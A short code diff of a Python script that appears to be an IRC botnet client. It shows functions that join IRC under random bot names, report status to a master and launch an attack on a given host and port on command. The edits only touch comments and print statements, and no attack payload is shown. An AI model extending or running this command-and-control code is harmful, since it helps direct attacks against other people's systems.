@@ -14,7 +14,7 @@ except Exception as err:
     sys.exit()
 
 
-
+# use to establish the first connection with a irc
 def connect():
     while True:
         botname = "bot"+str(random.randint(0,999999))
@@ -60,6 +60,7 @@ def shutdown():
 #use to handle status command
 def status(masterName):
     msg = "PRIVMSG "+masterName+" :Here\r\n"
+    print(msg)
     irc.send(msg.encode())
     return
 #use to attack
@@ -75,7 +76,6 @@ def attack(masterName, hostname,port):
     except Exception as err:
         msg = "PRIVMSG "+masterName+" :fail, "+str(err)+"\r\n"
         irc.send(msg.encode())
-        print(err)
     return
 #use to move
 def move(hostname1,port1,channel1):
@@ -103,7 +103,6 @@ def move(hostname1,port1,channel1):
 
         if joinChannel(channel1):
             break
-
 
     return
 # use the listen to chat
